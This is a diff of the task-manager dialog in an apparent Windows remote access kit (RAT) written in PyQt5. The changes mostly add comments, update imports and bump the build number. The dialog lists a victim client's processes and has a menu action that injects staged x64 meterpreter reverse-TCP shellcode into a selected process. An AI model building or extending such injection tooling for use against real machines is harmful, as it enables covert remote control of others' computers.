@@ -10,21 +10,21 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 from PyQt5 import QtCore, QtGui, QtWidgets
 from PyQt5.Qt import Qt
 from PyQt5.QtWidgets import QWidget,QMenu
 from PyQt5.QtCore import QEvent
 
-from ..utils.file_paths import DSFilePath,BGPath
-from ..logging.logging import LoggingUtilitys,ConsoleWindow
-from ..Qt5.icons import IconObj
+from core.utils.file_paths import DSFilePath,BGPath
+from core.logging.logging import LoggingUtilitys,ConsoleWindow
+from core.Qt5.icons import IconObj
 
-from ..client_handling.enumeration import SystemCommands
-from ..client_handling.system import SystemManager
-from ..client_handling.shell import Meterpreter
-from ..client_handling.meterpreter_payloads import MSFPayload
+from core.client_handling.enumeration import SystemCommands
+from core.client_handling.system import SystemManager
+from core.client_handling.shell import Meterpreter
+from core.client_handling.meterpreter_payloads import MSFPayload
 
 import os
 
@@ -114,10 +114,10 @@ class Ui_task_manager_dialog(QWidget):
             if action == kill_process:                                        #If the action is to kill a process
                 self.kill_task()                                              #Kill the task
 
-            if action == x64_reverse_tcp:
-                ConsoleWindow().log_to_console(f'Generating meterpreter shellcode, please standby!')
-                process_pid = self.task_table_widget.item(self.task_table_widget.currentRow(),1).text()
-                Meterpreter().inject_msf_payload(
+            if action == x64_reverse_tcp:                                     #if the action is to inject msf shellcode
+                ConsoleWindow().log_to_console(f'Generating meterpreter shellcode, please standby!')   #Log to console
+                process_pid = self.task_table_widget.item(self.task_table_widget.currentRow(),1).text() #Get process pid
+                Meterpreter().inject_msf_payload(                                                       #Prepare and inject payload
                     MSFPayload().staged_x64_reverse_tcp,
                     process_pid,
                     self.encryption_key,
@@ -127,17 +127,28 @@ class Ui_task_manager_dialog(QWidget):
         return super().eventFilter(source, event)
 
     def setupUi(self, task_manager_dialog,client_socket_obj,encryption_key):
+        """
+        Initialize UI parameters
+        """
         task_manager_dialog.setObjectName("task_manager_dialog")
         task_manager_dialog.resize(535, 704)
         task_manager_dialog.setWindowIcon(IconObj().task_manager_icon)
+        """
+        Make encryption key and client socket obj accessible throughout the class
+        so we can communicate with the agent that is presenting us the process's
+        """
         self.client_socket_obj = client_socket_obj
         self.encryption_key = encryption_key
+        """
+        Create object, set geometry, stylesheet and name
+        """
         self.task_table_widget = QtWidgets.QTableWidget(task_manager_dialog)
         self.task_table_widget.setGeometry(QtCore.QRect(20, 30, 491, 581))
         self.task_table_widget.setStyleSheet(f"background-image: url({BGPath().task_man_bg});")
-        self.task_table_widget.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
-        self.task_table_widget.installEventFilter(self)
         self.task_table_widget.setObjectName("task_table_widget")
+        """
+        Handle table widget settings
+        """
         self.task_table_widget.setColumnCount(3)
         self.task_table_widget.setRowCount(0)
         item = QtWidgets.QTableWidgetItem()
@@ -149,6 +160,11 @@ class Ui_task_manager_dialog(QWidget):
         item = QtWidgets.QTableWidgetItem()
         self.task_table_widget.setHorizontalHeaderItem(2, item)
         self.task_table_widget.setColumnWidth(2, 92)
+        """
+        Set configurations for the table widget which will display all of our
+        running process's on the client
+        """
+        self.task_table_widget.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
         self.task_table_widget.horizontalHeader().setVisible(True)
         self.task_table_widget.horizontalHeader().setCascadingSectionResizes(False)
         self.task_table_widget.horizontalHeader().setHighlightSections(False)
@@ -158,6 +174,10 @@ class Ui_task_manager_dialog(QWidget):
         self.task_table_widget.verticalHeader().setSortIndicatorShown(False)
         self.task_table_widget.verticalHeader().setStretchLastSection(False)
         self.task_table_widget.verticalHeader().setVisible(False)
+        """
+        Finish setting up the UI and populate the table widget with our process data from the client
+        """
+        self.task_table_widget.installEventFilter(self)
         self.retranslateUi(task_manager_dialog)
         self.populate_task_list()
         QtCore.QMetaObject.connectSlotsByName(task_manager_dialog)
